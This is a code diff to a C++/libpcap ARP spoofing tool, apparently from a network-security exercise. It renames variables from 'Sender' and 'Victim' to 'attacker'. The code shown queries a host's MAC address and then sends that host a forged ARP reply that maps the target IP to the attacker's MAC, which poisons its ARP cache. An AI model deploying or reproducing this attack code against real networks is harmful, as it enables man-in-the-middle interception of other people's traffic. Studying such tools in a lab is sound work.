@@ -84,12 +84,12 @@ void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& smac, Ip& arp_sip, Mac&
 	}
 }
 
-int ipv4_arp_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Mac Sender_mac){
+int ipv4_arp_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Mac attacker_mac){
 	if(arp_packet->eth_.type() != EthHdr::Arp)
 		return 0;
 	if(arp_packet->arp_.op() != ArpHdr::Reply)
 		return 0;
-	if(arp_packet->arp_.sip() == sender_ip && arp_packet->arp_.tmac() == Sender_mac){
+	if(arp_packet->arp_.sip() == sender_ip && arp_packet->arp_.tmac() == attacker_mac){
 	
 		return 1;
 	}
@@ -106,16 +106,16 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	
-	Mac SenderMac;
-	Ip SenderIp, senderIp, targetIp;
+	Mac attackerMac , senderMac , targetMac;
+	Ip attackerIp, senderIp, targetIp;
 	
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	
-	get_mac_addr(dev, SenderMac);
-	get_ip(dev,SenderIp);
-	cout << "[Victim MAC Address] " << string(SenderMac) << "\n";
-	cout << "[Victim IP Address] " << string(SenderIp) << "\n";
+	get_mac_addr(dev, attackerMac);
+	get_ip(dev,attackerIp);
+	cout << "[attacker MAC Address] " << string(attackerMac) << "\n";
+	cout << "[attacker IP Address] " << string(attackerIp) << "\n";
 	
 	
 	for (int i = 0; i < ((argc / 2) - 1); i++)
@@ -128,14 +128,14 @@ int main(int argc, char* argv[]) {
 		}
 
 		senderIp = Ip(argv[2+i*2]);
-		cout <<"[Setting Sender IP >> " << argv[i*2+2] << "]\n";
+		cout <<"[Setting attacker IP >> " << argv[i*2+2] << "]\n";
 		targetIp = Ip(argv[3+i*2]);
 		cout << "[Setting Target IP >> " << argv[i*2+3] << "]\n";
 		
 		Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
 		Mac zero = Mac("00:00:00:00:00:00");
 		Mac smac;
-		send_arp_packet(handle, broadcast, SenderMac, SenderIp, zero, senderIp, 1 );
+		send_arp_packet(handle, broadcast, attackerMac, attackerIp, zero, senderIp, 1 );
 		int res;
 		while (true) {
 			struct pcap_pkthdr* header;
@@ -147,11 +147,11 @@ int main(int argc, char* argv[]) {
 				break;
 			}
 			struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)packet;
-			if (ipv4_arp_checker(eth_arp_packet,senderIp,SenderMac)){
+			if (ipv4_arp_checker(eth_arp_packet,senderIp,attackerMac)){
 				cout << "[sender IP Address " << string(eth_arp_packet->arp_.sip()) << "]\n";
 				cout << "[sender MAC Address " << string(eth_arp_packet->arp_.smac()) << "]\n";
 				smac=eth_arp_packet->arp_.smac();
-				send_arp_packet(handle, smac, SenderMac, targetIp,smac, senderIp, 0 );
+				send_arp_packet(handle, smac, attackerMac, targetIp,smac, senderIp, 0 );
 				printf("complete\n");
 				break;
 			}
